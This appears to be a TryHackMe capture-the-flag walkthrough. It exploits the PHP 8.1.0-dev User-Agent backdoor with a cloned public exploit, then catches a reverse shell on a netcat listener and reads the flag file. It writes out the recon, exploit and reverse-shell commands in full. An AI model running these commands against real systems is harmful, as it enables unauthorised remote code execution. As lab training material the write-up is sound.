First Things First

Recon & Enumeration:

Ran a full Nmap scan on the target:

nmap -sC -sV  <target IP>

Open ports:

    22 (SSH)

    80 (HTTP)

On visiting the website, I found a basic "Agent Portal" (Dashboard if you will) login page. I ran a directory brute-force using gobuster and found /info.php. That revealed the PHP version running: PHP 8.1.0-dev.

gobuster dir -u http://<target i.p> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o gobuster.txt

Exploitation:

PHP 8.1.0-dev has a known backdoor from March 2021, where code can be executed via the User-Agent header.

I downloaded the exploit from Exploit-DB (ID 49933):

https://www.exploit-db.com/exploits/49933

Then cloned the exploit:

git clone https://github.com/flast101/php-8.1.0-dev-backdoor-rce.git

....cd into directory...

cd php-8.1.0-dev-backdoor-rce

Started a netcat listener on a separate terminal:

nc -lvnp 4444


STOP!!! Did you start the Netcat listener on port 4444 ????


Run the Python exploit:

Make sure you have Python3

python3 --version

Run:

python3 revshell_php_8.1.0-dev.py http://10.10.X.X 10.8.X.X 4444

IP	Belongs To:
10.10.X.X	Target (TryHackMe Viln Machine)
10.8.X.X	Attacker (Your Attacking Machine)

This gave me a reverse shell as www-data on my listener.

Privilege Escalation:

I looked for the flag (on the listening terminal)

find / -name flag.txt 2>/dev/null

Found it at:
/flag.txt

Read the flag:

cat /flag.txt

Paste the flag in the challenge answer.



Tools Used:

    Nmap

    Gobuster

    Netcat

    Python

    Exploit-DB

Lessons Learned:

    Exposing dev versions like PHP 8.1.0-dev in production is dangerous.

    PHPinfo pages can leak sensitive version data.

    Always test custom headers like User-Agent for RCE.
